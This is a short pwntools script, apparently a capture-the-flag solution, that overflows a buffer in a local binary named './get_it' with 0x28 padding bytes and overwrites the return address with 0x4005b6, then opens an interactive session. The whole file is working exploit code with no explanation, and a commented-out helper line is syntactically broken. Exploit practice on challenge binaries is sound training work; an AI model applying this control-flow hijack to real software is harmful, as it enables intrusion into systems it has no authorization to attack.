from pwn import *

#Calc hex
#print(hex(7fffffffde08 - 7fffffffdde0)

target = process('./get_it')

payload = b'\x00'*0x28 + p64(0x4005b6)


target.send(payload)

target.interactive()
